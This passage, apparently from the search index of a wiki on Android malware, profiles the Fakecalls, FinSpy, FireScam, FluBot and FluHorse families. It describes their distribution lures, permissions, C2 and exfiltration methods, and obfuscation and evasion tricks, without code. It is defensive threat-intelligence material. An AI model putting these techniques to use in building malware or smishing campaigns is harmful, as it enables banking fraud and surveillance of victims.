number</li> <li>Fakecalls intercepts the outgoing call before it connects</li> <li>The call is redirected to the attacker's infrastructure</li> <li>The real bank's phone number continues to display on screen</li> <li>Pre-recorded IVR audio plays, mimicking the bank's automated menu</li> <li>Victim follows voice prompts, entering account numbers, PINs, card numbers</li> <li>Captured data transmitted to C2</li> <li>Optionally, a live Korean-speaking attacker takes over the call</li> </ol>"},{"location":"malware/families/fakecalls/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/fakecalls/#call-interception","title":"Call Interception","text":"<p>Fakecalls uses Android's call management APIs to intercept and redirect outgoing calls:</p> <ul> <li>Registers as a phone call handler through the dialer role</li> <li>Monitors outgoing calls for target bank phone numbers</li> <li>Blocks the actual call from connecting</li> <li>Plays pre-recorded audio through the in-call audio stream</li> <li>Displays a fake call UI showing the real bank number</li> </ul> <p>This requires CALL_PHONE, READ_PHONE_STATE, and ANSWER_PHONE_CALLS permissions.</p>"},{"location":"malware/families/fakecalls/#legitimate-signing-key-abuse","title":"Legitimate Signing Key Abuse","text":"<p>McAfee documented variants signed with a compromised legitimate Android app signing key:</p> <ul> <li>APK signed with a key associated with legitimate Korean apps</li> <li>Bypasses signature-based detection that trusts known signing certificates</li> <li>Passes some device-level app verification checks</li> <li>The key compromise may have occurred through developer account theft or insider access</li> </ul>"},{"location":"malware/families/fakecalls/#pre-recorded-audio","title":"Pre-Recorded Audio","text":"<p>The malware contains Korean-language audio files mimicking bank IVR systems:</p> Audio Content Welcome greeting \"Thank you for calling [Bank Name]\" Menu prompts \"Press 1 for account balance, press 2 for transfers...\" Information requests \"Please enter your account number followed by the pound key\" Hold music Standard hold music matching the impersonated bank Confirmation \"Your transaction is being processed, please hold\""},{"location":"malware/families/fakecalls/#target-regions","title":"Target Regions","text":"Region Details South Korea Exclusive target <p>Target banks include KB Kookmin Bank, Shinhan Bank, Samsung Card, Hana Bank, and other major Korean financial institutions. The Korean-language IVR recordings and specific bank impersonation limit operations to Korean-speaking victims.</p>"},{"location":"malware/families/fakecalls/#notable-campaigns","title":"Notable Campaigns","text":"<p>2022: Fakecalls first appears targeting Korean banking users with call interception capabilities. Kaspersky publishes analysis documenting the voice phishing mechanism, call spoofing, and pre-recorded IVR system.</p> <p>2023: McAfee discovers Fakecalls variants signed with a legitimate app signing key, revealing a new evasion technique. The compromised signing key allows the malware to bypass multiple layers of signature-based verification.</p>"},{"location":"malware/families/fakecalls/#references","title":"References","text":""},{"location":"malware/families/finspy/","title":"FinSpy","text":"<p>FinSpy (also sold as FinFisher) was a commercial surveillance suite developed by Munich-based FinFisher GmbH and marketed to law enforcement and intelligence agencies worldwide. Active from approximately 2012 through 2022, it stood out for its extraordinary obfuscation: multiple protection layers, a custom virtual machine, anti-analysis checks, and ISP-level delivery mechanisms. The company collapsed in 2022 after German prosecutors investigated the unauthorized export of surveillance software to Turkey. FinSpy's obfuscation complexity became a benchmark in the malware analysis community, with researchers from ESET, Kaspersky, and Amnesty International investing months to produce public analyses.</p>"},{"location":"malware/families/finspy/#overview","title":"Overview","text":"Attribute Details First Seen 2012 (mobile variants), earlier on desktop Last Seen 2022 (company bankruptcy) Status FinFisher GmbH dissolved, no new development expected Type Commercial spyware (law enforcement/intelligence) Attribution FinFisher GmbH (Munich, Germany), subsidiary of Gamma Group (UK) Aliases FinFisher, FinSpy Mobile, FinSpy PC, Wingbird (Microsoft) Platforms Android, iOS, Windows, macOS, Linux"},{"location":"malware/families/finspy/#origin-and-lineage","title":"Origin and Lineage","text":"<p>FinFisher GmbH operated as a subsidiary of Gamma Group International, a UK-based company. The product line included desktop and mobile implants marketed at trade shows like ISS World (the \"Wiretappers' Ball\") alongside a full suite of network injection tools for ISP-level deployment.</p> <p>Citizen Lab first documented FinFisher's mobile capabilities in August 2012 in their report \"The SmartPhone Who Loved Me,\" identifying FinSpy samples for Android, iOS, BlackBerry, Windows Mobile, and Symbian. A 2014 breach of Gamma Group's servers by the hacktivist \"Phineas Fisher\" leaked 40GB of internal data, including FinFisher source code, client lists, and pricing documents. The leak confirmed sales to governments with poor human rights records including Bahrain, Ethiopia, and Turkmenistan.</p> <p>Citizen Lab mapped FinFisher's proliferation across dozens of countries in their 2015 report \"Pay No Attention to the Server Behind the Proxy,\" identifying C2 servers in more countries than any previous scan despite the 2014 leak.</p> <p>In 2022, FinFisher GmbH filed for insolvency and was dissolved following a criminal investigation by the Munich Public Prosecutor's Office. The investigation, triggered by a criminal complaint from GFF, Reporters Without Borders, netzpolitik.org, and ECCHR, focused on the unauthorized export of surveillance software to Turkey. In May 2023, German prosecutors charged four former executives of the corporate group.</p>"},{"location":"malware/families/finspy/#distribution","title":"Distribution","text":"<p>FinFisher used multiple delivery mechanisms, with ISP-level injection being the most distinctive.</p> Vector Details ISP-level man-in-the-middle Network injection appliances deployed at ISPs intercept download requests and replace legitimate software with trojanized versions. ESET documented this in 2017, identifying ISP-level MITM in Turkey (Turk Telekom) and Egypt where downloads of legitimate software (Avast, CCleaner, Opera, 7-Zip, WinRAR) were silently replaced with FinSpy-bundled installers. Spear-phishing Emails with malicious attachments or links tailored to specific targets Physical access Direct installation when agents have physical possession of the device Trojanized apps APKs disguised as legitimate applications distributed through links or alternative app stores <p>The ISP-level injection is particularly relevant because it requires cooperation (willing or coerced) from the target's internet service provider, meaning the deploying government has domestic authority over telecommunications infrastructure.</p>"},{"location":"malware/families/finspy/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/finspy/#android-implant","title":"Android Implant","text":"<p>The Android variant provides comprehensive surveillance. Kaspersky documented updated iOS and Android implants in July 2019, noting activity in nearly 20 countries:</p> Capability Implementation Call recording Record voice calls, VoIP calls (Skype, WhatsApp, Viber, etc.) Messaging Intercept SMS, MMS, and messages from Signal, Telegram, WhatsApp, Threema, Facebook Messenger Camera Silent activation of front and rear cameras for photo and video Microphone Ambient audio recording, room monitoring Location GPS tracking, cell tower positioning Keylogging Capture keystrokes across all applications via accessibility Contacts and calendar Full exfiltration File access Browse and exfiltrate device storage Screen capture Periodic screenshots Root exploitation Abuse known vulnerabilities to gain root privileges"},{"location":"malware/families/finspy/#desktop-variants","title":"Desktop Variants","text":"<p>While this wiki focuses on Android, FinSpy's desktop capabilities are worth noting for context: Kaspersky's 2021 analysis revealed a UEFI bootkit that infects the Windows Boot Manager for persistence below the OS level, and Amnesty International documented Linux and macOS variants targeting Egyptian civil society organizations.</p>"},{"location":"malware/families/finspy/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/finspy/#obfuscation-the-defining-feature","title":"Obfuscation: The Defining Feature","text":"<p>FinSpy's obfuscation is what separates it from every other commercial spyware family. Multiple research teams have documented its layered protection:</p> <p>Four-layer obfuscation system (Kaspersky, 2021):</p> Layer Technique Layer 1 FinSpy Mutator: instruction-level code transformation Layer 2 OLLVM-style obfuscation: control flow flattening, bogus control flow, instruction substitution Layer 3 Custom virtual machine: bytecode interpreter that executes protected functions in a proprietary VM ISA Layer 4 Anti-analysis shellcodes: environment fingerprinting that terminates execution in sandboxes and VMs <p>Custom Virtual Machine (ESET, January 2018):</p> <p>ESET researcher Filip Kafka published \"ESET's guide to deobfuscating and devirtualizing FinFisher\", the definitive public reference for analyzing FinFisher's VM. The VM translates native x86 instructions into custom bytecode at build time. At runtime, a bytecode interpreter executes these instructions, meaning static analysis tools like IDA Pro see only the interpreter loop rather than the actual logic. ESET also released IDA Python scripts on GitHub to assist with devirtualization.</p>"},{"location":"malware/families/finspy/#android-specific-obfuscation","title":"Android-Specific Obfuscation","text":"<p>The Android variant uses its own protection scheme. Defensive Lab Agency analyzed FinSpy for Android (designated DexDen in their analysis), finding:</p> <ul> <li>Configuration data encrypted and hidden within the APK</li> <li>Heavy use of JNI (Java Native Interface) calls to move logic into native code where Dalvik-level analysis tools cannot follow</li> <li>Anti-emulator checks targeting common analysis environments</li> <li>String encryption with runtime decryption</li> </ul>"},{"location":"malware/families/finspy/#persistence","title":"Persistence","text":"<p>On Android, FinSpy registers as a device administrator and uses accessibility services to prevent removal. On rooted devices, it installs system-level components. The desktop variant achieves persistence through a UEFI bootkit (Kaspersky) that operates below the operating system, surviving OS reinstallation.</p>"},{"location":"malware/families/finspy/#c2-communication","title":"C2 Communication","text":"<p>FinSpy communicates with its C2 over HTTPS with custom encryption. Citizen Lab's scanning research identified that FinFisher uses anonymizing proxy servers to obscure the true location of master C2 servers, though their 2015 research devised techniques to unmask these proxies.</p>"},{"location":"malware/families/finspy/#known-deployments-and-targets","title":"Known Deployments and Targets","text":"<p>Citizen Lab's cumulative research identified FinFisher deployments or suspected use in over 30 countries:</p> Region Countries Middle East &amp; North Africa Bahrain, Egypt, Jordan, Lebanon, Morocco, Oman, Saudi Arabia, Turkey, UAE Sub-Saharan Africa Angola, Ethiopia, Gabon, Kenya, Nigeria, South Africa Europe Austria, Belgium, Czech Republic, Estonia, Germany, Hungary, Italy, Netherlands, Serbia, Slovenia, Spain Asia Bangladesh, Indonesia, Malaysia, Mongolia, Pakistan, Singapore, Vietnam Americas Mexico, Paraguay, Venezuela <p>Confirmed targets include Bahraini activists and dissidents, Ethiopian opposition journalists, Turkish political targets (the export that triggered the criminal investigation), and Egyptian civil society organizations.</p>"},{"location":"malware/families/finspy/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>August 2012: Citizen Lab publishes \"The SmartPhone Who Loved Me\", the first documentation of FinFisher mobile implants across Android, iOS, BlackBerry, Windows Mobile, and Symbian.</p> <p>August 2014: The hacktivist \"Phineas Fisher\" breaches Gamma Group servers, leaking 40GB of FinFisher data including source code, client lists, and deployment documentation. The leak confirms sales to governments in Bahrain, Ethiopia, and Turkmenistan.</p> <p>October 2015: Citizen Lab publishes \"Pay No Attention to the Server Behind the Proxy\", mapping FinFisher to operations in 32+ countries despite the 2014 breach.</p> <p>September 2017: ESET documents ISP-level MITM campaigns in Turkey and Egypt, where downloads of legitimate software were intercepted and replaced with FinSpy-bundled versions at the ISP level.</p> <p>January 2018: ESET publishes their whitepaper on deobfuscating and devirtualizing FinFisher, providing the first public methodology for defeating FinFisher's custom VM protection.</p> <p>July 2019: Kaspersky discovers updated FinSpy mobile implants active in nearly 20 countries, including new features and improved obfuscation for both iOS and Android.</p> <p>September 2020: Amnesty International and Defensive Lab Agency document new FinSpy variants targeting Egyptian civil society, including previously unknown Linux and macOS versions.</p> <p>September 2021: Kaspersky publishes \"FinSpy: unseen findings\", revealing the four-layer obfuscation system, the UEFI bootkit, and advanced anti-analysis measures. This represents the most comprehensive technical teardown of FinFisher's protection layers.</p> <p>March 2022: FinFisher GmbH files for insolvency and is dissolved after German authorities seize company accounts. The Chaos Computer Club declares a \"stage win\" against the surveillance industry.</p> <p>May 2023: Munich prosecutors charge four former FinFisher executives for illegally exporting surveillance software to Turkey without the required export license.</p>"},{"location":"malware/families/finspy/#references","title":"References","text":""},{"location":"malware/families/firescam/","title":"FireScam","text":"<p>FireScam is an Android information stealer discovered by CYFIRMA in January 2025 that masquerades as a Telegram Premium application. The malware is distributed through a phishing page impersonating RuStore, Russia's domestic app store launched after Western sanctions led to the removal of major apps from the Russian Google Play Store. FireScam leverages Google Firebase for both C2 configuration delivery and real-time data exfiltration, using Firebase's real-time database as a staging area for stolen data. The malware intercepts notifications across all applications, captures clipboard contents, monitors e-commerce transactions, and exfiltrates credentials, messaging data, and device information. Its targeting of Russian-speaking users through a fake RuStore page positions it as a threat specifically calibrated for the post-sanctions Russian mobile ecosystem.</p>"},{"location":"malware/families/firescam/#overview","title":"Overview","text":"Attribute Details First Seen January 2025 Status Active Type Information stealer, spyware Aliases None known Attribution Unknown Distribution Fake RuStore phishing page, Telegram Premium lure"},{"location":"malware/families/firescam/#origin-and-lineage","title":"Origin and Lineage","text":"<p>CYFIRMA published their analysis in January 2025, documenting FireScam as a newly discovered Android threat with no known lineage to existing malware families. The choice of RuStore as a distribution vector and Telegram Premium as the lure application suggests an operator with specific knowledge of the Russian mobile ecosystem and user behavior patterns.</p> <p>RuStore was launched in 2022 by Russian internet company VK (formerly Mail.ru Group) as an alternative app store after Google restricted access to Google Play for Russian users and many Western app developers withdrew from the Russian market. Russian users who adopted RuStore are accustomed to sideloading apps from alternative sources, making them more susceptible to phishing pages that replicate the RuStore interface. The Telegram Premium lure exploits the platform's massive popularity in Russia, where Telegram serves as a primary communication channel for both personal and business use.</p>"},{"location":"malware/families/firescam/#distribution","title":"Distribution","text":"Vector Details Fake RuStore page Phishing website replicating Russia's RuStore app marketplace Telegram Premium lure Malware disguised as the premium version of Telegram"},{"location":"malware/families/firescam/#attack-flow","title":"Attack Flow","text":"<ol> <li>The victim visits a phishing page designed to look like the RuStore app store</li> <li>The page presents a fake \"Telegram Premium\" application for download</li> <li>The victim downloads and installs a dropper APK from the phishing page</li> <li>The dropper requests storage and package installation permissions</li> <li>The dropper extracts and installs the main FireScam payload</li> <li>FireScam requests extensive permissions including notification access, clipboard monitoring, and SMS access</li> <li>A fake Telegram login screen captures the victim's credentials</li> <li>FireScam establishes communication with Firebase infrastructure for C2 and data exfiltration</li> </ol>"},{"location":"malware/families/firescam/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/firescam/#core-features","title":"Core Features","text":"Capability Implementation Notification interception Monitors and captures notifications from all applications on the device Clipboard monitoring Continuously captures clipboard contents, including copied passwords and tokens E-commerce monitoring Tracks e-commerce transactions and captures financial data from shopping apps Credential theft Fake Telegram login screen harvests credentials at install time SMS collection Reads and exfiltrates text messages Contact exfiltration Harvests the device contact list Call log harvesting Extracts call history Device profiling Collects device model, OS version, storage information, and installed apps"},{"location":"malware/families/firescam/#notification-interception","title":"Notification Interception","text":"<p>FireScam's notification interception captures data from every application on the device. This includes messaging apps, email clients, banking apps, and authentication tools. By reading notification content, the malware can harvest one-time passwords (OTPs), two-factor authentication codes, message previews, and transaction alerts without needing to directly compromise each individual application.</p>"},{"location":"malware/families/firescam/#e-commerce-monitoring","title":"E-Commerce Monitoring","text":"<p>FireScam specifically monitors e-commerce application activity, capturing transaction details, payment information, and purchase history. This targeted capability suggests the operators are interested in financial data beyond what traditional banking trojans collect through overlay attacks, focusing instead on the broader spectrum of digital commerce activity.</p>"},{"location":"malware/families/firescam/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/firescam/#firebase-infrastructure","title":"Firebase Infrastructure","text":"<p>FireScam's most distinctive technical characteristic is its reliance on Google Firebase as core infrastructure. The malware uses Firebase in two roles:</p> Firebase Function Purpose C2 configuration Delivers operational parameters and commands to the implant Real-time database Serves as a staging area for exfiltrated data before operator retrieval <p>Using Firebase provides several operational advantages. Firebase traffic is directed to Google-owned domains, making it indistinguishable from legitimate app traffic at the network level. Firebase's real-time database functionality allows the malware to continuously stream stolen data without maintaining a dedicated C2 server. This reduces the infrastructure footprint the operator must manage and eliminates a traditional indicator of compromise (a suspicious C2 domain).</p> <p>This Firebase-centric approach shares architectural similarities with KoSpy, which uses Firebase Firestore for C2 configuration delivery. However, FireScam takes the Firebase dependency further by also using the real-time database for data exfiltration, whereas KoSpy switches to a dedicated C2 server for ongoing communication and data collection.</p>"},{"location":"malware/families/firescam/#dropper-mechanism","title":"Dropper Mechanism","text":"<p>FireScam uses a two-stage installation process. The initial APK downloaded from the fake RuStore page functions as a dropper that extracts and installs the main payload. This separation allows the dropper to appear relatively benign during initial analysis, with the bulk of malicious functionality contained in the second-stage payload.</p>"},{"location":"malware/families/firescam/#permissions","title":"Permissions","text":"Permission Purpose BIND_NOTIFICATION_LISTENER_SERVICE Intercept all push notifications for OTP and credential harvesting READ_SMS Read SMS messages RECEIVE_SMS Intercept incoming SMS READ_CONTACTS Exfiltrate contact list READ_CALL_LOG Extract call history READ_EXTERNAL_STORAGE Access files on device storage READ_PHONE_STATE Device profiling INTERNET Firebase C2 communication and data exfiltration REQUEST_INSTALL_PACKAGES Dropper installs main payload"},{"location":"malware/families/firescam/#target-regions","title":"Target Regions","text":"Region Details Russia Primary target: Russian-speaking users who use RuStore and Telegram <p>The fake RuStore distribution page, Telegram Premium lure, and Russian-language interface collectively confirm that FireScam is designed specifically for Russian-speaking victims. The post-sanctions Russian mobile ecosystem, where sideloading from alternative stores has become normalized, creates an environment where users are more likely to download apps from unfamiliar sources.</p>"},{"location":"malware/families/firescam/#notable-campaigns","title":"Notable Campaigns","text":"<p>January 2025: CYFIRMA disclosed FireScam after discovering the phishing page impersonating RuStore and distributing a fake Telegram Premium application. The analysis documented the Firebase-based C2 and exfiltration architecture, notification interception capabilities, and e-commerce monitoring. The campaign specifically targets Russian-speaking users navigating the alternative app store ecosystem that emerged after Western sanctions.</p>"},{"location":"malware/families/firescam/#related-families","title":"Related Families","text":"Family Relationship KoSpy Both use Google Firebase infrastructure for C2 configuration delivery, leveraging legitimate Google services to blend malicious traffic with normal app behavior. KoSpy uses Firebase Firestore for configuration and a separate C2 for data collection, while FireScam uses Firebase for both configuration and data exfiltration. SpyNote Both are Android surveillance tools that intercept notifications, capture credentials, and exfiltrate device data. SpyNote operates as a commodity RAT builder with a broad operator base, while FireScam is a focused information stealer targeting the Russian mobile ecosystem through a specific distribution chain."},{"location":"malware/families/firescam/#references","title":"References","text":"<ul> <li>CYFIRMA - Inside FireScam: An Android information stealer (January 2025)</li> </ul>"},{"location":"malware/families/flubot/","title":"FluBot","text":"<p>FluBot was an SMS-spreading Android banking trojan that achieved worm-like propagation by sending smishing messages to every contact on an infected device. Between late 2020 and mid-2022, it became one of the fastest-spreading mobile threats in history, harvesting over 11 million phone numbers in Spain alone (roughly 25% of the population). Dutch police seized its infrastructure in May 2022 as part of an Europol-coordinated operation involving 11 countries.</p>"},{"location":"malware/families/flubot/#overview","title":"Overview","text":"Attribute Details First Seen Late 2020 Last Seen June 2022 (infrastructure seized) Type Banking trojan, SMS worm, credential stealer Attribution Unknown, infrastructure operated from the Netherlands Aliases Cabassous, FedEx Banker"},{"location":"malware/families/flubot/#origin-and-lineage","title":"Origin and Lineage","text":"<p>FluBot first appeared targeting Spanish banking customers in late 2020. PRODAFT published the first major technical analysis after gaining visibility into the operation, revealing the scale of the botnet: approximately 60,000 active infected devices with access to harvested phone numbers from millions of contacts. The malware has no known direct code lineage to earlier banking trojan families, appearing as an independently developed project that drew on established techniques (overlay attacks, accessibility abuse) combined with a novel SMS worm propagation mechanism.</p> <p>FluBot's rapid spread and operational success attracted imitators. Both Medusa and Anatsa were observed using FluBot's distribution network and mimicking its smishing templates, as documented by Proofpoint and ThreatFabric.</p>"},{"location":"malware/families/flubot/#distribution","title":"Distribution","text":"<p>FluBot distributed exclusively through SMS phishing (smishing). The infection chain:</p> <pre><code>Victim receives SMS: \"Your package is arriving, track here: [link]\"\n    \u2192 Link leads to fake delivery tracking page (DHL, FedEx, Correos, UPS)\n    \u2192 Page prompts to download \"tracking app\" APK\n    \u2192 APK requests Accessibility Service permission on install\n    \u2192 Once granted: overlay attacks enabled, SMS access gained\n    \u2192 Malware reads victim's contact list\n    \u2192 Sends smishing SMS to all contacts from victim's device\n    \u2192 Cycle repeats on each new infection\n</code></pre> <p>The self-propagating SMS mechanism was the key differentiator. Each infected device became a distribution node, creating exponential growth. Proofpoint estimated tens of thousands of malicious SMS messages sent per hour during peak campaigns, with some subscribers receiving up to six FluBot SMS messages.</p>"},{"location":"malware/families/flubot/#lure-themes-by-region","title":"Lure Themes by Region","text":"Region Lure Theme Spain Correos (postal service), MRW delivery Germany DHL package tracking UK Royal Mail, DHL Italy Poste Italiane Australia Australia Post Japan Yamato Transport <p>After police action against the Spain-focused campaign in early 2021, operators pivoted to new regions rapidly, adapting lure templates to local postal services.</p>"},{"location":"malware/families/flubot/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/flubot/#core-functions","title":"Core Functions","text":"Capability Description SMS worm Reads contact list, sends smishing SMS from victim's device to all contacts Overlay attacks Injects phishing pages over banking and cryptocurrency apps to steal credentials SMS interception Reads, intercepts, and hides incoming SMS (steals OTPs) Contact exfiltration Uploads full contact list to C2 Notification interception Monitors push notifications for 2FA codes Keylogging Records keystrokes on targeted apps Remote control Operators can send commands for USSD execution, app installation, SMS sending Uninstall prevention Uses Accessibility Service to close settings/uninstall dialogs"},{"location":"malware/families/flubot/#version-evolution","title":"Version Evolution","text":"<p>FluBot iterated rapidly across versions. Fox-IT / NCC Group published a detailed version history and F5 Labs covered the v5.0 changes:</p> Version Date Changes 1.0-2.x Late 2020 Initial Spain campaign, basic overlay attacks, SMS worm 3.4 Early 2021 Reduced DGA domain count from 5,000 to 2,500 per month 3.7 March 2021 Replaced <code>.com</code> TLD in DGA with <code>.su</code> 3.9 March 2021 Introduced DNS-over-HTTPS (DoH) for DGA domain resolution 4.0 April 2021 Switched DoH provider from Cloudflare to Google 4.1 2021 Added multiple DoH providers: Google, Cloudflare, AliDNS 4.9 Late 2021 Direct HTTPS communication on port 443 after DGA resolution; expanded targeting to Australia, Japan 5.0 Early 2022 Replaced DGA+DoH with DNS tunneling over HTTPS; expanded to 30 TLDs; added remote seed change command"},{"location":"malware/families/flubot/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/flubot/#domain-generation-algorithm-dga","title":"Domain Generation Algorithm (DGA)","text":"<p>FluBot's DGA was central to its resilience. The algorithm generated domains based on a seed derived from the current year and month. NCSC-NL tracked FluBot DGA domains and F-Secure (now WithSecure) analyzed the DoH tunneling mechanism:</p> Parameter Details Seed Derived from current month and year Domain count 5,000 initially, reduced to 2,500 in v3.4, expanded again in v5.0 Domain length 15 characters TLDs (pre-v5) <code>.ru</code>, <code>.su</code>, <code>.cn</code> TLDs (v5.0+) 30 different TLDs Resolution DNS-over-HTTPS (v3.9+), then DNS tunneling over HTTPS (v5.0+)"},{"location":"malware/families/flubot/#c2-communication","title":"C2 Communication","text":"Version Method v1-v3.8 Standard DNS resolution of DGA domains, then HTTPS to resolved IP v3.9-v4.x DGA domains resolved via DNS-over-HTTPS (Cloudflare, Google, AliDNS), then HTTPS to resolved IP v5.0+ DNS tunneling: C2 data encoded in DNS queries sent via DoH providers; responses embedded in DNS replies <p>The DNS tunneling in v5.0 was a significant evolution. Instead of resolving DGA domains to get a C2 IP and then communicating over HTTPS, the malware embedded C2 commands and data directly within DNS queries and responses, using DoH providers as unwitting relays. This made traffic analysis substantially harder since all visible traffic appeared to be DNS queries to legitimate providers.</p>"},{"location":"malware/families/flubot/#encryption","title":"Encryption","text":"<ul> <li>C2 traffic encrypted with RSA public key embedded in the APK</li> <li>Payload APK encrypted within the dropper</li> <li>SMS message templates received from C2 in encrypted form</li> </ul>"},{"location":"malware/families/flubot/#overlay-injection","title":"Overlay Injection","text":"<p>FluBot targeted banking and cryptocurrency apps with HTML-based overlay pages loaded in WebViews. The inject list was received from C2 and matched against installed packages on the device. When a target app was foregrounded (detected via Accessibility Service), the corresponding phishing overlay was displayed.</p>"},{"location":"malware/families/flubot/#target-regions","title":"Target Regions","text":"<p>FluBot expanded geographically across its lifespan:</p> Phase Period Regions Initial Late 2020 - Early 2021 Spain European expansion Q1-Q2 2021 Germany, Italy, UK, Hungary, Poland, Finland, Sweden Global expansion Q3 2021 - 2022 Australia, New Zealand, Japan Late stage Early 2022 Additional European countries, attempted US expansion <p>BSI/CERT-Bund published advisories during the German campaign, and INCIBE-CERT (Spain) published a full analysis study documenting the original Spanish operations.</p>"},{"location":"malware/families/flubot/#notable-campaigns","title":"Notable Campaigns","text":"<p>2020, December: FluBot first appears targeting Spanish banking users through Correos (Spanish postal service) smishing lures. PRODAFT gains access to the operation and estimates 60,000 infected devices with 11 million harvested phone numbers from Spain.</p> <p>2021, March: Spanish police arrest four suspects linked to FluBot distribution. The operation pauses briefly, then resumes with expanded targeting. FluBot begins hitting Germany, Italy, and the UK.</p> <p>2021, April: Proofpoint publishes analysis warning that FluBot is spreading rapidly through Europe and may reach the US. Reports approximately 7,000 active UK infections with SMS volumes in the tens of thousands per hour.</p> <p>2021, June: BlackBerry publishes a technical breakdown of FluBot's overlay and SMS mechanisms. Multiple European CERTs issue public warnings.</p> <p>2021, Q4: FluBot v4.9 expands to Australia, New Zealand, and Japan with localized lure templates. Cyble documents the v4.9 New Zealand campaign.</p> <p>2022, Early: FluBot v5.0 deploys DNS tunneling over HTTPS, as analyzed by F-Secure and F5 Labs.</p> <p>2022, May: Dutch police seize FluBot infrastructure in an operation coordinated by Europol's European Cybercrime Centre (EC3). 11 countries participated: Australia, Belgium, Finland, Hungary, Ireland, Spain, Sweden, Switzerland, the Netherlands, and the United States. Police disconnected 10,000 victims from the botnet during the raid.</p> <p>2022, June: Fox-IT / NCC Group publishes a retrospective covering the full version history from initial discovery through takedown. No FluBot activity has been observed since the infrastructure seizure.</p>"},{"location":"malware/families/flubot/#related-families","title":"Related Families","text":"<p>Other major smishing-distributed families include MoqHao (Roaming Mantis), which uses similar SMS-based distribution targeting East Asian users and predates FluBot by two years. MoqHao's 2024 variants achieved auto-execution without user interaction, an evolution FluBot never reached before its takedown.</p>"},{"location":"malware/families/flubot/#references","title":"References","text":""},{"location":"malware/families/fluhorse/","title":"FluHorse","text":"<p>FluHorse is a Flutter-based Android credential stealer targeting East Asian users, first documented by Check Point Research in May 2023. What distinguishes FluHorse from other Android malware is its use of the Flutter framework (Dart language) for implementing malicious functionality. Because Flutter compiles Dart code into a native shared library (<code>libapp.so</code>) that runs inside a custom virtual machine, traditional Android reverse engineering tools cannot decompile or analyze the business logic through standard Dalvik/Java approaches. FluHorse impersonates popular toll-collection and banking apps in Taiwan and Vietnam, harvesting credentials, credit card data, and intercepted 2FA codes via SMS. Activity traces back to at least May 2022, with campaigns continuing through ongoing deployment of new infrastructure and apps each month.</p>"},{"location":"malware/families/fluhorse/#overview","title":"Overview","text":"Attribute Details First Seen May 2022 (earliest activity), May 2023 (public disclosure) Status Active Type Credential stealer, SMS interceptor Attribution Unknown Discovered By Check Point Research Target Region East Asia (Taiwan, Vietnam) Distribution Phishing emails with fake APK download links Notable Feature Built with Flutter/Dart, business logic compiled into <code>libapp.so</code>"},{"location":"malware/families/fluhorse/#distribution","title":"Distribution","text":"Vector Details Phishing emails Targeted emails sent to high-profile entities including government officials and employees of large industrial companies Fake APK downloads Email links direct victims to phishing sites hosting malicious APKs App impersonation Mimics popular legitimate apps with over 1 million installs each <p>FluHorse campaigns begin with targeted phishing emails. The emails are crafted to appear urgent and credible, sometimes referencing payment issues or account problems. Recipients are directed to a phishing site via a link in the email, where they download a fake app APK. The social engineering relies on impersonating apps that the target audience already trusts and uses frequently.</p>"},{"location":"malware/families/fluhorse/#impersonated-applications","title":"Impersonated Applications","text":"App Region Legitimate Installs ETC (Electronic Toll Collection) Taiwan 1,000,000+ VPBank Neo Vietnam 1,000,000+ Unnamed major transportation app Taiwan 1,000,000+ <p>The Taiwan targeting leverages the Far Eastern Electronic Toll Collection (FETC) system, which processes approximately 16 million transactions per day across more than 6 million users, making it a high-value impersonation target.</p>"},{"location":"malware/families/fluhorse/#capabilities","title":"Capabilities","text":"<ul> <li>Credential theft: fake login screens prompt victims to enter account credentials, which are exfiltrated to the C2 server</li> <li>Credit card harvesting: prompts victims to enter credit card details under the guise of payment processing</li> <li>SMS interception: intercepts all incoming SMS messages, including 2FA codes, using the Telephony package</li> <li>2FA bypass: captured SMS authentication codes enable attackers to bypass two-factor authentication on compromised accounts</li> <li>Delayed execution: after credential submission, the app displays a \"system is busy\" message while silently processing stolen data, buying time before the victim suspects anything</li> </ul>"},{"location":"malware/families/fluhorse/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/fluhorse/#flutter-architecture","title":"Flutter Architecture","text":"<p>FluHorse's defining technical characteristic is its use of the Flutter framework. The malware is written in Dart and compiled using Flutter's ahead-of-time (AOT) compilation:</p> Component Role <code>libflutter.so</code> Flutter engine (legitimate framework library) <code>libapp.so</code> Compiled Dart payload containing all malicious logic Kotlin wrapper Minimal Android shell, handles app launch and Flutter engine initialization <p>The Dart code inside <code>libapp.so</code> runs within Flutter's custom virtual machine rather than the Dalvik VM. Standard Android reverse engineering tools like jadx or apktool cannot decompile this payload. Analyzing <code>libapp.so</code> requires specialized approaches for Dart AOT snapshots, which involve optimized and poorly documented formats with limited tooling support.</p> <p>Fortinet's FortiGuard Labs published a detailed reverse engineering analysis demonstrating techniques for statically reversing the Dart AOT snapshot within <code>libapp.so</code>. This work, later presented at Virus Bulletin 2024, advanced the tooling available for analyzing Flutter-based malware.</p>"},{"location":"malware/families/fluhorse/#malicious-flow","title":"Malicious Flow","text":"<ol> <li>Victim installs the fake app from the phishing site</li> <li>App displays a convincing replica of the legitimate app's login interface</li> <li>Victim enters credentials (account details or credit card data)</li> <li>Data is exfiltrated to the C2 server via HTTP POST</li> <li>App displays a \"system is busy\" holding screen for several minutes</li> <li>Meanwhile, the Dart payload begins intercepting all incoming SMS messages</li> <li>Intercepted SMS messages (including 2FA codes) are forwarded to the C2 server</li> <li>After the delay period, the app tells the user to try again later</li> </ol>"},{"location":"malware/families/fluhorse/#c2-communication","title":"C2 Communication","text":"<p>FluHorse uses HTTP-based C2 communication. The Dart payload sends stolen data via HTTP POST requests to attacker-controlled servers. Fortinet's analysis identified the path <code>/addcontent3</code> as one of the endpoints used for exfiltrating intercepted SMS messages. The simplicity of the protocol reflects the malware's overall design philosophy: rely on the Flutter framework for obfuscation rather than implementing custom evasion in the network layer.</p>"},{"location":"malware/families/fluhorse/#anti-analysis","title":"Anti-Analysis","text":"Technique Details Flutter framework Business logic in <code>libapp.so</code> defeats standard Android decompilation Dart AOT compilation Custom VM with optimized, undocumented snapshot format Minimal native code Almost no analyzable Kotlin/Java logic, everything is in Dart Packing (later samples) June 2023 samples introduced packing, indicating operational maturity <p>The initial May 2023 campaign samples had minimal obfuscation and no packing. By June 2023, Check Point observed packed samples appearing, showing the operators were actively hardening their 